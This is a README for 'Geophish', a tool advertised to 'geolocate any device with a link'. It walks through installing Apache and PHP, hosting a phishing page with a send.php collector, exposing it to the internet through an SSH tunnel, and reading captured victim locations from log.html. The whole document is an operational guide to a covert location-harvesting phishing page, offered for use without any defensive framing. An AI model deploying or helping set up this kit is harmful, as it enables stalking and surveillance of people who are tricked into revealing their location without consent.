
# Geophish
Geolocate any device with a link
# How to use
1.  Update and install PHP
```bash
sudo apt update
sudo apt upgrade -y
sudo apt install -y php 
```
2. Clone repo
```bash
cd && git clone https://github.com/thegoodhackertv/Geophish
```
3. Install apache2, other dependencies and restart service
```bash
sudo apt install -y apache2 libapache2-mod-php
sudo service apache2 restart
```
4. Host files with apache and set permissions
```bash
sudo cp Geophish/index.html Geophish/send.php /var/www/html
sudo chown -R www-data:www-data /var/www/html
```
Alternatively you can use php
```bash
cd Geophish
php -S 0.0.0.0:80
```
5. Expose your website to the internet
- First Method (Easiest)
Create a tunnel using [localhost.run](http://localhost.run/)
`ssh -R 80:localhost:80 nokey@localhost.run`
-  Second Method
Host files on your own server, use a domain and install certbot to enable HTTPS
6. All captured locations will be saved on a file called `log.html` on the root directory of your website.
